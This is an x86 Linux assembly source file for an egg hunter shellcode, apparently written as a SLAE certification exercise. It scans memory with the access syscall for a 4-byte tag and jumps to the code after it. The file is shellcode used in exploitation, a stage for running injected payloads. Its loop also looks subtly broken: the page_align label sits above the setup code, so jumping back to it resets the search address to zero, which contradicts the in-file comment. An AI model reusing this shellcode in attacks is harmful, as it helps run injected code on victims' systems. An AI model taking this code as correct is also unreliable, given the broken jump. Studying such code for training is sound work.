; Tested on:
; Ubuntu 17.04 
; Linux 4.10.0-42-generic i686
; 
; This has been created for completing the requirements of the 
; SecurityTube Linux Assembly Expert certification: 
; http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/
;  
; Student ID: SLAE-966 
; 
; References: 
; 1) Hacking: The Art of Exploitation by Jon Erickson
; 2) http://man7.org/linux/man-pages/man2/
; 3) Safely Searching Process Virtual Address Space by Skape
;	http://web.archive.org/web/20061010194043/http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf
;

global _start
section .text

_start:
page_align:
	mov ebx,0x50905090
	xor ecx,ecx
	mul ecx
next_address:
	or dx,0xfff
	inc edx
	pusha
	lea ebx,[edx+0x4]
	mov al,0x21
	int 0x80
	cmp al,0xf2
	popa
	jz page_align 		; jz 0x9
	cmp [edx],ebx
	jnz next_address	; jnz 0xe
	cmp [edx+0x4],ebx
	jnz next_address	; jnz 0xe
	jmp edx